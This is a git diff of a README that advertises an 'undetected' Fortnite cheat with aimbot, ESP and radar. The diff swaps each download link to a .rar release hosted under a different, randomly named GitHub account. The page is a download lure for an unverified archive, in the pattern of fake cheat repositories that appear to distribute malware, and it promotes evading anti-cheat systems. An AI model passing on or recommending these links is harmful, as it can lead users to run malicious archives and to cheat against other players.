@@ -1,6 +1,6 @@
 <div align="center">
   
-  [Fortnite cheat](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/Fortnite/fortnite.1.5.rar)
+  [Fortnite cheat](https://github.com/StuccoSultanJoint/Fortnite-cheat/releases/download/download/fortniteV1.2.rar)
 
  > **The ultimate, feature-rich undetected utility for Fortnite. Full control over Aimbot, ESP, Radar, and Performance options.**
   
@@ -23,9 +23,9 @@
 ---
 
 
-### [⬇️ Download](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/Fortnite/fortnite.1.5.rar)
+### [⬇️ Download](https://github.com/StuccoSultanJoint/Fortnite-cheat/releases/download/download/fortniteV1.2.rar)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/Fortnite/fortnite.1.5.rar).
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/StuccoSultanJoint/Fortnite-cheat/releases/download/download/fortniteV1.2.rar).
 
 
 </div>
